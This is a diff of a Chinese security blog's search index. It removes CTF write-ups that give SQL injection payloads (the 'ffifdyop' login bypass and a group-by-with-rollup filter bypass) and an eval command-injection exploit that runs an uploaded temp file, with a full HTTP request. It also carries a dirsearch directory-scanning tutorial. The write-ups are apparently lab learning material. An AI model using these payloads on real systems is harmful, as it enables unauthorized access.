-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)&gt;<span class="number">10</span>)&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;password error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure>
-
-<p>有限制长度</p>
-<p>所以在密码框中输入 ffifdyop, 即可登录成功, 获取flag</p>
-<h1 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h1><p>和web9一样。先查看一下源码，<br> 右键查看源代码<br> 进入style.css<br> 发现有index.phps<br> 在url处输入后，查看源码得到</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">		$flag=&quot;&quot;;</span><br><span class="line">        function replaceSpecialChar($strParam)&#123;</span><br><span class="line">             $regex = &quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;;</span><br><span class="line">             return preg_replace($regex,&quot;&quot;,$strParam);</span><br><span class="line">        &#125;</span><br><span class="line">        if (!$con)</span><br><span class="line">        &#123;</span><br><span class="line">            die(&#x27;Could not connect: &#x27; . mysqli_error());</span><br><span class="line">        &#125;</span><br><span class="line">		if(strlen($username)!=strlen(replaceSpecialChar($username)))&#123;</span><br><span class="line">			die(&quot;sql inject error&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		if(strlen($password)!=strlen(replaceSpecialChar($password)))&#123;</span><br><span class="line">			die(&quot;sql inject error&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		$sql=&quot;select * from user where username = &#x27;$username&#x27;&quot;;</span><br><span class="line">		$result=mysqli_query($con,$sql);</span><br><span class="line">			if(mysqli_num_rows($result)&gt;0)&#123;</span><br><span class="line">					while($row=mysqli_fetch_assoc($result))&#123;</span><br><span class="line">						if($password==$row[&#x27;password&#x27;])&#123;</span><br><span class="line">							echo &quot;登陆成功&lt;br&gt;&quot;;</span><br><span class="line">							echo $flag;</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>发现被过滤了这些东西select|from|where|join|sleep|and|\s|union|,<br>又被这个避免了双写绕过if(strlen($password)!&#x3D;strlen(replaceSpecialChar($password))){ die(“sql inject error”);}</p>
-<p>定义了过滤函数，对username和password进行过滤，然后判断输入的password是否对应根据我们输入的username从数据库中查到的密码</p>
-<p>这时候，我们要用到group by和roll with<br>group by（将结果集中的数据行根据选择列的值进行逻辑分组）：<br>在使用group by以后会按照password中的值进行排列：<br>with rollup （group by 后可以跟with rollup，表示在进行分组统计的基础上再次进行汇总统计）<br>此时我们发现，多出一行NULL，并且count（*）为统计和。<br>加入with rollup后 password有一行为NULL。<br>payload在用户名框中进行输入，密码框不输入，使其为空，满足 p a s s w o r d &#x3D; &#x3D; password&#x3D;&#x3D; password&#x3D;&#x3D;row[‘password’]</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27;/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#&amp;password=</span><br></pre></td></tr></table></figure>
-
-<h1 id="红包题第二弹"><a href="#红包题第二弹" class="headerlink" title="红包题第二弹"></a>红包题第二弹</h1><p>查看源代码，按注释提示，构造参数试试?cmd&#x3D;aa</p>
-<pre><code>&lt;?php
-#error_reporting(0);
-?&gt;
-&lt;html lang=&quot;zh-CN&quot;&gt;
- 
-&lt;head&gt;
-    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;
-    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width  minimum-scale=1.0  maximum-scale=1.0  initial-scale=1.0&quot; /&gt;
-    &lt;title&gt;ctf.show_红包题&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-    &lt;center&gt;
-    &lt;h2&gt;ctf.show_红包题&lt;/h2&gt;
-    &lt;h4&gt;where is the flag?&lt;/h4&gt;
-    &lt;/center&gt;
-    &lt;!-- hint:?cmd= --&gt;
-    &lt;?php
-        if(isset($_GET[&#39;cmd&#39;]))&#123;
-            $cmd=$_GET[&#39;cmd&#39;];
-            highlight_file(__FILE__);
-            if(preg_match(&quot;/[A-Za-oq-z0-9$]+/&quot;,$cmd))&#123;
-            
-                die(&quot;cerror&quot;);
-            &#125;
-            if(preg_match(&quot;/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#39;|\&quot;|\:|\,/&quot;,$cmd))&#123;
-                die(&quot;serror&quot;);
-            &#125;
-            eval($cmd);
-        
-        &#125;
-    
-     ?&gt;
- 
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-<p>源码中过滤了很多东西，可以使用的字符：p &#96; ? &#x2F; + &lt; &gt; &#x3D;</p>
-<p>通过可用的字符构造cmd&#x3D;?&gt;&lt;?&#x3D;<code>.+/??p/p?p??????</code>，由eval（$cmd）来运行临时文件</p>
-<p>备注：问号?代表一个任意字符，通配符&#x2F;??p&#x2F;p?p??????匹配&#x2F;tmp&#x2F;phpxxxxxx</p>
-<p>构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=?&gt;&lt;?=`.+/??p/p?p??????`;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>然后bp抓包，修改几个地方，发现根目录下有flag.txt</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /?cmd=?&gt;&lt;?=`.+/??p/p?p??????`; HTTP/1.1</span><br><span class="line">Host: 4947507e-e5ac-452c-8f01-80f5309742d9.challenge.ctf.show</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 237</span><br><span class="line"></span><br><span class="line">-----------------------------10242300956292313528205888</span><br><span class="line">Content-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;1.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">#! /bin/sh</span><br><span class="line"></span><br><span class="line">ls /</span><br><span class="line">-----------------------------10242300956292313528205888--</span><br></pre></td></tr></table></figure>
-
-<p>修改命令为cat &#x2F;flag.txt 得到flag</p>
+<p>python3 setup.py install</p>
+<h1 id="4-使用命令"><a href="#4-使用命令" class="headerlink" title="4.使用命令"></a>4.使用命令</h1><p>常用命令<br>–version            显示dirsearch的版本<br>-h –help            帮助提示<br>-u  –url            指定网址<br>-e                   指定网站语言<br>-w                   指定字典<br>-r                   递归目录（跑出目录后，继续跑目录下面的目录）<br>-l  –url-list&#x3D;FILE  目标url文件路径<br>-i                   保留的响应状态码(以逗号分隔,支持指定范围) 如(-i 200,300-399)<br>-x                   排除的响应状态码(以逗号分隔,支持指定范围)  如(-x 301,500-599)</p>
+<p>简单使用<br>&#x2F;&#x2F;简单的使用方法<br>python3 dirsearch.py -u <a href="https://target/">https://target</a><br>&#x2F;&#x2F;使用文件拓展名为php和txt以及js的字典扫描目标<br>python3 dirsearch.py -e php,txt,js -u <a href="https://target/">https://target</a><br>&#x2F;&#x2F;采用指定路径的wordlist且拓展名为php，txt，js的字典扫描目标url<br>python3 dirsearch.py -e php,txt,js -u <a href="https://target/">https://target</a> -w &#x2F;path&#x2F;to&#x2F;wordlist<br>&#x2F;&#x2F;采用递归扫描<br>python3 dirsearch.py -e php,txt,js -u <a href="https://target/">https://target</a> -r<br>&#x2F;&#x2F;采用递归扫描 递归层数为三层<br>python3 dirsearch.py -e php,txt,js -u <a href="https://target/">https://target</a> -r -R 3</p>
 ]]></content>
       <tags>
-        <tag>ctf解题</tag>
+        <tag>安全工具</tag>
       </tags>
   </entry>
   <entry>
@@ -4089,42 +4207,6 @@ tap
 ]]></content>
       <tags>
         <tag>xss</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>dirsearch</title>
-    <url>/2023/08/15/dirsearch/</url>
-    <content><![CDATA[<h1 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h1><span id="more"></span>
-
-<p>dirsearch是一个基于python3的命令行工具，常用于暴力扫描页面结构，包括网页中的目录和文件。</p>
-<p>相比其他扫描工具disearch的特点是：</p>
-<pre><code>支持HTTP代理
-多线程
-支持多种形式的网页（asp,php）
-生成报告（纯文本，JSON）
-启发式检测无效的网页
-递归扫描
-用户代理随机化
-批量处理
-扫描器与字典（注：字典必须是文本文件）
-</code></pre>
-<p>下载及安装<br> 要求:python 3.7或更高版本 </p>
-<pre><code>其中，db文件夹为自带字典文件夹；reports为扫描日志文件夹；dirsearch.py为主程序文件 
-</code></pre>
-<h1 id="2-下载地址"><a href="#2-下载地址" class="headerlink" title="2.下载地址"></a>2.下载地址</h1><p><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p>
-<p>目前版本是更新到0.42。</p>
-<h1 id="3-下载到本地，安装使用"><a href="#3-下载到本地，安装使用" class="headerlink" title="3.下载到本地，安装使用"></a>3.下载到本地，安装使用</h1><p>pip3 install -r requirements.txt     &#x2F;&#x2F;安装依赖包</p>
-<p>下载超时了，找国内镜像。如：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install -r requirements.txt -i https://pypi.douban.com/simple</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">阿里云：http://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>
-
-<p>python3 setup.py install</p>
-<h1 id="4-使用命令"><a href="#4-使用命令" class="headerlink" title="4.使用命令"></a>4.使用命令</h1><p>常用命令<br>–version            显示dirsearch的版本<br>-h –help            帮助提示<br>-u  –url            指定网址<br>-e                   指定网站语言<br>-w                   指定字典<br>-r                   递归目录（跑出目录后，继续跑目录下面的目录）<br>-l  –url-list&#x3D;FILE  目标url文件路径<br>-i                   保留的响应状态码(以逗号分隔,支持指定范围) 如(-i 200,300-399)<br>-x                   排除的响应状态码(以逗号分隔,支持指定范围)  如(-x 301,500-599)</p>
-<p>简单使用<br>&#x2F;&#x2F;简单的使用方法<br>python3 dirsearch.py -u <a href="https://target/">https://target</a><br>&#x2F;&#x2F;使用文件拓展名为php和txt以及js的字典扫描目标<br>python3 dirsearch.py -e php,txt,js -u <a href="https://target/">https://target</a><br>&#x2F;&#x2F;采用指定路径的wordlist且拓展名为php，txt，js的字典扫描目标url<br>python3 dirsearch.py -e php,txt,js -u <a href="https://target/">https://target</a> -w &#x2F;path&#x2F;to&#x2F;wordlist<br>&#x2F;&#x2F;采用递归扫描<br>python3 dirsearch.py -e php,txt,js -u <a href="https://target/">https://target</a> -r<br>&#x2F;&#x2F;采用递归扫描 递归层数为三层<br>python3 dirsearch.py -e php,txt,js -u <a href="https://target/">https://target</a> -r -R 3</p>
-]]></content>
-      <tags>
-        <tag>安全工具</tag>
       </tags>
   </entry>
 </search>
